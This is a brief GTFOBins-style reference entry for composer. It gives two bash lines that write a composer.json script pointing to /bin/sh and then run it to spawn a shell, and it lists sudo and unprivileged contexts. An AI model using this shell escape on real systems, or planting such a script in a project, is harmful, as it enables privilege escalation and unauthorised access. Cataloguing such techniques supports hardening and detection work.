---
type: gtfobin
name: composer
platform: Unix
functions: [shell]
tags: [gtfobin, unix, lotl]
---

# composer

## shell

```bash
echo '{"scripts":{"x":"/bin/sh"}}' >composer.json
composer run-script x
```
**Contexts:** sudo, unprivileged
